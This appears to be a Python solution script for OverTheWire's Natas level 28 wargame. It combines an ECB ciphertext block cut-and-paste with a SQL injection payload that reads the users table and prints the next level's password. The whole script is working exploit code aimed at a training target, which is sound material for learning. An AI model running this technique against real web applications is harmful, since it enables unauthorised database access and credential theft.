import string
import requests
import re
import base64
from natas_utility import *
import html
import urllib

current_level = 28
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url

session = requests.session()


def split_by_blocks(blk_size, message):
    return_blocks = []
    for i in range(0, int(len(message) / blk_size) + 1):
        block = message[blk_size * i:blk_size * (i + 1)]
        if len(block) == blk_size:
            return_blocks.append(block)
    return return_blocks


def call_oracle(padding):
    data = {'query': padding}
    response_url = session.post(url=base_url, data=data, auth=auth).url
    url_regex = re.compile(r'search\.php/\?query=(.+)')
    query = url_regex.findall(urllib.parse.unquote(response_url))[0]
    query = base64.b64decode(query)
    return query


padding_len = 90

found_text = ''

alphabet = string.printable

block_size = 16

blocks = call_oracle('a' * padding_len + ' UNION ALL SELECT CONCAT(username       , password) FROM users;#' + 'b' * 20)
block_array = split_by_blocks(block_size, blocks)

pwn = b''.join(block_array[8:12])

blocks = call_oracle('a' * (padding_len - 2))
block_array = split_by_blocks(block_size, blocks)
attack = b''.join(block_array[:8]) + pwn + b''.join(block_array[8:])

pwn = base64.b64encode(attack).decode('utf-8')

pwn = requests.utils.quote(pwn, safe='')

pwn_url = '{}/search.php/?query={}'.format(url, pwn)
response = session.get(pwn_url, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n').replace('<br>', '\n')

password_regex = re.compile(r'<h2> Whack Computer Joke Database</h2><ul><li>natas29(.+)</li></ul>')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
